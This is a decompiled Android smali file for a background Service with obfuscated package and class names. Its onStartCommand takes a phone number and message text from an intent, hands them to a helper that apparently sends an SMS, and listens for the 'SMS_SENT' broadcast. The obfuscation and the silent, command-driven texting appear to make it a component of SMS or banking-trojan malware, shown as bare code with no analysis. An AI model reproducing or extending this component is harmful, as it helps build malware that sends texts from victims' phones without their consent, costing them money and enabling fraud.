.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;
.super Landroid/app/Service;


# instance fields
.field a:Landroid/content/Context;

.field b:Lwocwvy/czyxoxmbauu/slsa/b;

.field c:Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;

    invoke-direct {v0, p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;-><init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;)V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->c:Landroid/content/BroadcastReceiver;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    new-instance p1, Ljava/lang/UnsupportedOperationException;

    const-string v0, "Not yet implemented"

    invoke-direct {p1, v0}, Ljava/lang/UnsupportedOperationException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    iput-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->a:Landroid/content/Context;

    const-string p2, "number"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "msg"

    invoke-virtual {p1, p3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object p3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {p3, p0, p2, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->c:Landroid/content/BroadcastReceiver;

    new-instance p2, Landroid/content/IntentFilter;

    const-string p3, "SMS_SENT"

    invoke-direct {p2, p3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p1, p2}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const/4 p1, 0x2

    return p1
.end method
